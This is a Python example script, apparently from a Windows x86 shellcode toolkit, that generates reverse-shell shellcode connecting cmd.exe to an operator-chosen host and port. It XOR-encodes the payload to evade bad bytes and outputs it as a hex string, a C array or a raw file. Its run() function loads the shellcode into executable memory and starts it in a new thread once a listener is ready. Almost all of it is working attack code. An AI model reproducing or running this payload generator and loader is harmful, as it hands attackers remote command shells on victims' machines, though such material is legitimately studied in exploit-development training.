#!/usr/bin/env -S uv run
"""
Example 02 — Reverse shell using revshell_code() from the toolkit.

The toolkit builder generates the complete ASM:
  - PEB walk + find_function trampoline (same as Example 01)
  - kernel32 resolution: LoadLibraryA, CreateProcessA, TerminateProcess
  - ws2_32 load + WSAStartup, WSASocketA, WSAConnect
  - STARTUPINFOA construction on the stack
  - CreateProcessA("cmd.exe") with socket handles wired to stdin/stdout/stderr

New concepts over Example 01:
  - revshell_code() returns (asm_string, SlotAllocator) — you can inspect
    the slot table to see where every function pointer lands in the EBP frame
  - encode_x86() wraps the shellcode in a XOR decoder if bad bytes are present
  - Output in multiple formats: hex string, C array, raw binary file

Usage:
    uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443
    uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443 --bad 000a0d
    uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443 --asm
    uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443 --c
    uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443 --out shell.bin
    uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443 --run  (Windows)
"""
import argparse
import ctypes
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from Tools.shellcode_x86_win import assemble, revshell_code
from Tools.shellcode_x86_win.assembler import check_bad_chars


def xor_encode(sc, bad_chars, key=None):
    """
    Simple single-byte XOR encoder.  Picks the first key byte (1-255) that
    avoids introducing bad bytes in both the key and the encoded payload.
    Returns encoded bytes prefixed with a small decoder stub, or raises
    ValueError if no clean key is found.
    """
    bad = set(bad_chars)
    for k in range(1, 256):
        if k in bad:
            continue
        encoded = bytes(b ^ k for b in sc)
        if not any(b in bad for b in encoded):
            # Minimal decoder stub: sets ECX=len, XORs [edi+ecx] with key, loops
            # This is illustrative — the full encoder in the toolkit handles
            # null-key avoidance, length encoding, and jmp/call/pop positioning.
            stub = (
                f"decoder:\n"
                f"    jmp  get_sc\n"
                f"got_sc:\n"
                f"    pop  edi\n"
                f"    mov  ecx, {hex(len(encoded))}\n"
                f"decode_loop:\n"
                f"    xor  byte ptr [edi + ecx - 1], {hex(k)}\n"
                f"    loop decode_loop\n"
                f"    jmp  edi\n"
                f"get_sc:\n"
                f"    call got_sc\n"
            )
            stub_sc, _ = assemble(stub)
            return bytes(stub_sc) + encoded, k
    raise ValueError("No single-byte XOR key avoids all bad bytes")


def build(lhost, lport, algo, rot, bad):
    # revshell_code() emits the full ASM string and a SlotAllocator
    # that records which EBP offset holds which function pointer.
    asm, slots = revshell_code(lhost, lport, algo, rot)

    sc, count = assemble(asm)
    sc = bytes(sc)
    print(f"[*] Assembled: {count} instructions, {len(sc)} bytes")

    hits = check_bad_chars(sc, bad) if bad else []
    if hits:
        print(f"[*] {len(hits)} bad byte(s) found — XOR encoding")
        sc, key = xor_encode(sc, bad)
        print(f"[*] Encoded size: {len(sc)} bytes  key=0x{key:02x}")
    elif bad:
        print(f"[*] No bad bytes in {bad.hex()} — raw shellcode is clean")

    return sc, asm


def print_slots(slots) -> None:
    print("\nEBP slot layout:")
    for name, offset in sorted(slots.table().items(), key=lambda x: x[1]):
        print(f"  [ebp+{hex(offset)}]  {name}")


def print_hex(sc: bytes) -> None:
    print(f'\n# {len(sc)} bytes')
    print('"' + "".join(f"\\x{b:02x}" for b in sc) + '"')


def print_c(sc: bytes) -> None:
    print(f"\nunsigned char shellcode[{len(sc)}] = {{")
    for i in range(0, len(sc), 12):
        row = ", ".join(f"0x{b:02x}" for b in sc[i:i+12])
        print(f"    {row}{',' if i + 12 < len(sc) else ''}")
    print("};")


def run(sc: bytes) -> None:
    buf = bytearray(sc)
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0), ctypes.c_int(len(buf)),
        ctypes.c_int(0x3000), ctypes.c_int(0x40))
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        (ctypes.c_char * len(buf)).from_buffer(buf),
        ctypes.c_int(len(buf)))
    print(f"\n[*] Shellcode at {hex(ptr)}")
    input("Start your listener, then press ENTER to execute...")
    ht = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
        ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


def main() -> None:
    ap = argparse.ArgumentParser(description="Example 02: Reverse shell via toolkit builder")
    ap.add_argument("--lhost", default="127.0.0.1")
    ap.add_argument("--lport", default=443, type=int)
    ap.add_argument("--algo",  default="ror",  help="ror | rolxor")
    ap.add_argument("--rot",   default=13,  type=int)
    ap.add_argument("--bad",   default="",  help="Bad bytes hex, e.g. 000a0d")
    ap.add_argument("--asm",   action="store_true", help="Print ASM source")
    ap.add_argument("--slots", action="store_true", help="Print EBP slot table")
    ap.add_argument("--hex",   action="store_true", help="Print hex string")
    ap.add_argument("--c",     action="store_true", help="Print C byte array")
    ap.add_argument("--out",   default="",  help="Write raw bytes to file")
    ap.add_argument("--run",   action="store_true", help="Execute on Windows")
    args = ap.parse_args()

    bad = bytes.fromhex(args.bad) if args.bad else b""

    print(f"[*] Target: {args.lhost}:{args.lport}  algo={args.algo}-{args.rot}")

    # Generate ASM (no Keystone needed for this step)
    asm, slots = revshell_code(args.lhost, args.lport, args.algo, args.rot)

    if args.asm:
        print(asm)
        return

    if args.slots:
        print_slots(slots)
        return

    try:
        sc, asm = build(args.lhost, args.lport, args.algo, args.rot, bad)
    except SystemExit:
        print("[!] keystone-engine not installed.")
        print("    pip install keystone-engine   or use --asm to view source")
        return

    if args.hex or (not args.c and not args.out and not args.run):
        print_hex(sc)

    if args.c:
        print_c(sc)

    if args.out:
        Path(args.out).write_bytes(sc)
        print(f"[+] Wrote {len(sc)} bytes → {args.out}")

    if args.run:
        if sys.platform != "win32":
            print("[!] --run requires Windows")
            return
        run(sc)


if __name__ == "__main__":
    main()
